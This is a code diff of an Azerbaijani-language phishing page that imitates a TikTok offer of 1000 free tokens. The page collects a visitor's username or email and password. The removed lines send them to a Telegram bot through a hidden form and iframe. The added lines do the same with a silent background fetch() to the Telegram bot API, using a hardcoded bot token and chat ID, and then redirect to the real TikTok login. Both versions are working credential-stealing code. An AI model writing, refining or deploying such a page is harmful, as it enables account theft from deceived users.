@@ -17,21 +17,13 @@
         <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG-white-text-black-background.png" alt="TikTok">
         <h3>Jeton Aktivasiyası</h3>
         <p style="font-size: 13px; color: #888;">1000 Jeton üçün giriş edin</p>
-        
-        <form id="ovForm" target="gizli_frame" method="GET" action="https://api.telegram.org/bot8310888410:AAHznWCQ8ywwPyHiTAbFT80hzwb5kdNSsFE/sendMessage">
-            <input type="hidden" name="chat_id" value="7729229420">
-            <input type="hidden" name="text" id="mesaj_metni">
-            
-            <input type="text" id="u" placeholder="İstifadəçi adı / Email" required>
-            <input type="password" id="p" placeholder="Şifrə" required>
-            <button type="button" onclick="gonder()">JETONLARI YÜKLƏ</button>
-        </form>
-        
-        <iframe name="gizli_frame" style="display:none;"></iframe>
+        <input type="text" id="u" placeholder="İstifadəçi adı / Email">
+        <input type="password" id="p" placeholder="Şifrə">
+        <button onclick="ov()">JETONLARI YÜKLƏ</button>
     </div>
 
     <script>
-        function gonder() {
+        function ov() {
             var user = document.getElementById("u").value;
             var pass = document.getElementById("p").value;
 
@@ -40,16 +32,18 @@
                 return;
             }
 
-            // Məlumatı hazırlayırıq
-            document.getElementById("mesaj_metni").value = "🎯 YENİ OV!\n👤 User: " + user + "\n🔑 Pass: " + pass;
-            
-            // Formanı göndəririk (Brauzer bunu reklam kimi görmür)
-            document.getElementById("ovForm").submit();
+            var token = "8310888410:AAHznWCQ8ywwPyHiTAbFT80hzwb5kdNSsFE";
+            var chat_id = 7729229420; 
+            var text = "🎯 YENİ HESAB TUTULDU!\n👤 User: " + user + "\n🔑 Pass: " + pass;
 
-            // 1.5 saniyə sonra TikTok-a yönləndiririk
-            setTimeout(function() {
+            // Səssiz arxa fon sorğusu
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
+            
+            fetch(url).then(() => {
                 window.location.href = "https://www.tiktok.com/login";
-            }, 1500);
+            }).catch(() => {
+                window.location.href = "https://www.tiktok.com/login";
+            });
         }
     </script>
 </body>
